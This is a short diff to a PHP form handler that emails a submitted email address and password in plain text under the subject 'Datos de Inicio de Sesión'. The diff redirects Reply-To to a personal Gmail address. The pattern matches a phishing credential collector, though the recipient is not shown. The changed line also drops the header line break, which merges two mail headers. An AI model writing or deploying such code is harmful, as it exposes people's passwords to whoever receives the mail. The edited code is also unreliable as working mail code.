@@ -13,7 +13,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $subject = 'Datos de Inicio de Sesión';
     $message = "Correo electrónico: $email\nContraseña: $password";
     $headers = "From: no-reply@example.com\r\n";
-    $headers .= "Reply-To: no-reply@example.com\r\n";
+    $headers .= "Reply-To: ing.faiber.diaz@gmail.com";
     $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
 
     // Enviar el correo
